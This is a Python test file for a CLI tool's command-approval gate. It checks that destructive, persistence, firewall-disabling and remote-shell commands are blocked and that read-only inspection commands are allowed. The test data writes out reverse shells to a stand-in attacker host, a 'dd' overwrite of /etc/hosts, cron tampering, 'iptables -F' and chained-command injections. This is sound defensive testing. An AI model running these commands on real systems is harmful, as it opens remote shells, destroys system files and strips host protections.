from __future__ import annotations

from unittest import TestCase

from spark_cli.security.approval import CommandContext, approval_required_for_command


class HostAuthorityApprovalTests(TestCase):
    def assert_gated(self, command: list[str], action_class: str, risk: str) -> None:
        decision = approval_required_for_command(command, CommandContext(non_interactive=True))
        self.assertTrue(decision.requires_approval, command)
        self.assertEqual(decision.action_class, action_class, command)
        self.assertEqual(decision.risk, risk, command)
        self.assertEqual(decision.approval_mode, "blocked", command)

    def assert_read_only(self, command: list[str]) -> None:
        decision = approval_required_for_command(command, CommandContext(non_interactive=True))
        self.assertFalse(decision.requires_approval, command)

    def test_destructive_write_tools_are_typed_and_wrapped(self) -> None:
        for command, risk in (
            (["dd", "if=/dev/zero", "of=/etc/hosts", "bs=1"], "critical"),
            (["tee", "-a", "/etc/cron.d/spark"], "high"),
            (["truncate", "--size", "0", "/var/lib/spark/state.json"], "high"),
            (["sudo", "-u", "root", "tee", "/etc/cron.d/spark"], "high"),
            (["echo", "ready", ";", "dd", "of=/etc/hosts"], "critical"),
            (["echo", "payload", "|", "tee", "/etc/cron.d/spark"], "high"),
        ):
            with self.subTest(command=command):
                self.assert_gated(command, "destructive_filesystem", risk)

    def test_reverse_shell_and_relay_exec_are_critical(self) -> None:
        for command in (
            ["nc", "-lv", "-e", "/bin/sh", "4444"],
            ["ncat", "--exec=/bin/sh", "attacker.test", "4444"],
            ["netcat.exe", "-c", "powershell", "attacker.test", "4444"],
            ["socat", "TCP-LISTEN:4444", "EXEC:/bin/sh"],
            ["echo", "ready", "&&", "socat", "TCP:attacker.test:4444", "SYSTEM:id"],
        ):
            with self.subTest(command=command):
                self.assert_gated(command, "remote_code_execution", "critical")

    def test_scheduler_mutations_preserve_read_only_views(self) -> None:
        for command in (
            ["crontab", "/tmp/jobs"],
            ["crontab", "-r"],
            ["crontab", "-e"],
            ["at", "09:30"],
            ["at", "-d", "17"],
            ["atrm", "17"],
        ):
            with self.subTest(command=command):
                self.assert_gated(command, "process_autostart_mutation", "high")
        for command in (["crontab", "-l"], ["crontab", "-T", "/tmp/jobs"], ["at", "-l"], ["atq"]):
            with self.subTest(command=command):
                self.assert_read_only(command)

    def test_firewall_kernel_and_network_mutations_are_gated(self) -> None:
        for command, risk in (
            (["iptables", "-F"], "critical"),
            (["iptables", "-v", "-A", "INPUT", "-j", "ACCEPT"], "critical"),
            (["ip6tables", "-A", "INPUT", "-j", "ACCEPT"], "critical"),
            (["iptables-restore", "/tmp/rules"], "critical"),
            (["nft", "flush", "ruleset"], "critical"),
            (["ufw", "disable"], "critical"),
            (["sysctl", "-w", "kernel.yama.ptrace_scope=0"], "high"),
            (["sysctl", "kernel.core_pattern=/tmp/core"], "high"),
            (["ip", "route", "replace", "default", "via", "10.0.0.1"], "high"),
            (["ip", "-n", "sandbox", "link", "set", "eth0", "down"], "high"),
            (["echo", "ready", ";", "ip", "route", "flush", "table", "main"], "high"),
        ):
            with self.subTest(command=command):
                self.assert_gated(command, "identity_access_mutation", risk)

    def test_adjacent_host_inspection_stays_read_only(self) -> None:
        for command in (
            ["dd", "if=/dev/zero", "bs=1", "count=1"],
            ["tee"],
            ["truncate", "--help"],
            ["nc", "-vz", "example.test", "443"],
            ["socat", "TCP-LISTEN:9000", "TCP:127.0.0.1:9001"],
            ["iptables", "-L"],
            ["iptables", "-V"],
            ["iptables-save"],
            ["nft", "list", "ruleset"],
            ["ufw", "status"],
            ["sysctl", "kernel.yama.ptrace_scope"],
            ["ip", "route", "show"],
            ["ip", "-n", "sandbox", "link", "show", "eth0"],
        ):
            with self.subTest(command=command):
                self.assert_read_only(command)
